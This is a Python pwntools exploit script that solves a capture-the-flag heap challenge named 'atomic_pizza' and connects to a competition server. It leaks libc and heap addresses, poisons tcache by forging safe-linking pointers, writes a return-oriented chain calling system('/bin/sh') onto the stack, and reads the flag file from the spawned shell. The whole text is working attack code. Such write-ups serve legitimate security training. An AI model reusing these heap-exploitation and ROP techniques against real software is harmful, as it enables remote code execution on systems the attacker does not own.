#!/usr/bin/env python3

from pwn import *
from time import sleep

elf = ELF("./atomic_pizza_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.REMOTE:
        if args.LOCAL:
            r = remote("localhost", 16010)
        else:
            r = remote("atomic-pizza.challs.olicyber.it", 16010)
        
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b *new_slice+112
                                b eat_slice
                                ignore 1 11
                                ignore 2 9
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def create_slice(size: int, content: bytes, idx: int, new_line=True):
    global r
    size -= 1 # the program will add 1 to the size
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(size).encode())
    if new_line:
        r.sendlineafter(b"> ", content)
    else:
        r.sendafter(b"> ", content)
    r.sendlineafter(b"> ", str(idx).encode())

def eat_slice(idx: int):
    global r
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"> ", str(idx).encode())
    r.sendlineafter(b"> ", b"y")

def change_topping(idx: int, new_size: int, content: bytes, new_line=True):
    global r
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode())
    r.sendlineafter(b"> ", str(new_size).encode())
    if new_line:
        r.sendlineafter(b"> ", content)
    else:
        r.sendafter(b"> ", content)

def change_favorite_topping(new_size: int, content: bytes):
    r.sendlineafter(b"> ", b"7")
    r.sendlineafter(b"> ", str(new_size).encode())
    r.sendlineafter(b"> ", content)

def see_slice_content(idx: int) -> bytes:
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(idx).encode())
    r.recvuntil(b"> ")
    return r.recvuntil(b"-----", drop=True)

def see_favorite_content() -> bytes:
    r.sendlineafter(b"> ", b"6")
    r.recvuntil(b"> ")
    return r.recvuntil(b"-----", drop=True)

def main():
    global r
    r = conn()

    # Leak libc and heap

    create_slice(0x90-2, b"pizza1  " + b"\x00"*6 + p16(0xffff) + b"here", 1)            # offset 2a0
    create_slice(0x60-2, b"pizza2  ", 2)            # offset 340
    create_slice(0x60-2, b"pizza3  ", 3)            # offset 3b0
    create_slice(0x430-2, b"unsorted pizza  ", 4)
    create_slice(0x10-2, b"padding", 5)
    create_slice(0x430-2, b"unsorted pizza 2", 6)
    create_slice(0x10-2, b"padding", 7)
    create_slice(0x60-2, b"usefull to allocate into libc ;)", 8)

    eat_slice(4) # this will eventually be in the largebins, so both libc and heap addresses are here
    eat_slice(5)
    eat_slice(6)
    eat_slice(7)
    eat_slice(8)

    eat_slice(2) # this will leave only pizza 1 and 3

    while True:
        r.sendlineafter(b"> ", b"5")
        r.sendlineafter(b"> ", b"")
        sleep(0.1)
        r.sendlineafter(b"> ", b"")
        r.recvuntil(b"> ")
        content = r.recvuntil(b"-----", drop=True)
        if content.startswith(b"here"):
            idx = content.find(p64(0x441))
            libc_base = u64(content[idx+8:idx+16]) - (libc.sym["main_arena"] + 1120)
            heap_base = u64(content[idx+24:idx+32]) - 0x410
            break

    libc.address = libc_base
    log.success(f"Libc base: {hex(libc_base)}")
    log.success(f"Heap base: {hex(heap_base)}")

    # Leak stack from libc

    mangled_ptr = (heap_base + 0x340 >> 12) ^ (libc.sym["__libc_argv"] - 0x150)
    payload = flat({0x86: [
            0x71,
            mangled_ptr,
            0x0
        ]})
    change_favorite_topping(0xffff-1, payload)

    create_slice(0x60-2, b"poisoned", 4) # this will put the libc addr in the 0x70 tcache bins, also it is at offset 0x340
    create_slice(0x60-2, b"\x00"*(0x60-3), 2, new_line=False)

    create_slice(0x60-2, b"tcache bins :D", 5)
    eat_slice(5)
    eat_slice(3)
    eat_slice(1)
    # now there are only pizzas 2 and 4

    change_favorite_topping(0xffff-1, payload[:-16] + p64(0xffff)) # now the pizza at idx 4 has powerfull rw

    while True:
        r.sendlineafter(b"> ", b"5")
        r.sendlineafter(b"> ", b"")
        sleep(0.1)
        r.sendlineafter(b"> ", b"")
        r.recvuntil(b"> ")
        content = r.recvuntil(b"-----", drop=True)
        if content.startswith(b"\xff\xff"):
            environ = u64(content[0x69be:0x69c6])
            break

    log.success(f"Environ: {hex(environ)}")

    # Write to stack

    mangled_ptr = (heap_base + 0x3b0 >> 12) ^ (environ - 0x128)
    payload = flat({0x66:[
            0x71,
            mangled_ptr,
            0x0
        ]})
    change_topping(4, 0xffff-1, payload)

    payload = flat({6: [
            libc.address + 0x2a3e5, # pop rdi
            next(libc.search(b"/bin/sh\x00")),
            libc.address + 0x29cd6, # ret (stack alignment)
            libc.sym["system"]
        ]})

    create_slice(0x60-2, b"stack :0", 1)
    create_slice(0x60-2, payload, 3)

    r.sendlineafter(b"> ", b"8")
    sleep(0.2)
    r.sendlineafter(b"Bye! :D", b"cat pizza_secret.txt")
    log.success(r.recvall(timeout=2).decode().strip())

    r.interactive()

if __name__ == "__main__":
    main()
